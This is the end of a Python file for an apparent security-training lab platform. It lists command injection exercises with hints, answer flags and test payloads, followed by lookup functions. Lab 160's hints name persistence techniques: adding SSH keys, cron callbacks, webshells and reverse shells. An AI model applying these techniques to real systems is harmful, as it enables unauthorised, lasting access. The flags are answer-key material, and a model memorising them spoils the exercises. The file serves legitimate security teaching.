        'vulnerableCode': 'Execute in specific shell',
        'hint1': 'Bash vs sh vs zsh have differences.',
        'hint2': 'Use bash-specific: {1..100}, etc.',
        'hint3': 'Payload: Shell-specific payload.',
        'flag': 'FLAG{cmd_inj_shell_specific_159}',
        'testPayload': 'echo {1..5}'
    },
    {
        'id': 160,
        'title': 'Command Injection - Advanced Persistence',
        'category': 'command_injection',
        'difficulty': 3,
        'points': 150,
        'description': 'Establish persistence via injection.',
        'scenario': 'Create backdoor or scheduled task.',
        'vulnerableCode': 'RCE allows system modification',
        'hint1': 'Add SSH key for persistence.',
        'hint2': 'Create cron job for callback.',
        'hint3': 'Install webshell or reverse shell.',
        'flag': 'FLAG{cmd_inj_persistence_160}',
        'testPayload': 'mkdir -p ~/.ssh'
    },
]

def get_all_labs():
    """Get all labs sorted by ID"""
    return sorted(LABS_DATABASE, key=lambda x: x['id'])

def get_labs_by_category(category):
    """Get labs filtered by category"""
    return [lab for lab in LABS_DATABASE if lab['category'] == category]

def get_lab_by_id(lab_id):
    """Get single lab by ID"""
    return next((lab for lab in LABS_DATABASE if lab['id'] == lab_id), None)

def get_labs_by_difficulty(difficulty):
    """Get labs filtered by difficulty level"""
    return [lab for lab in LABS_DATABASE if lab['difficulty'] == difficulty]
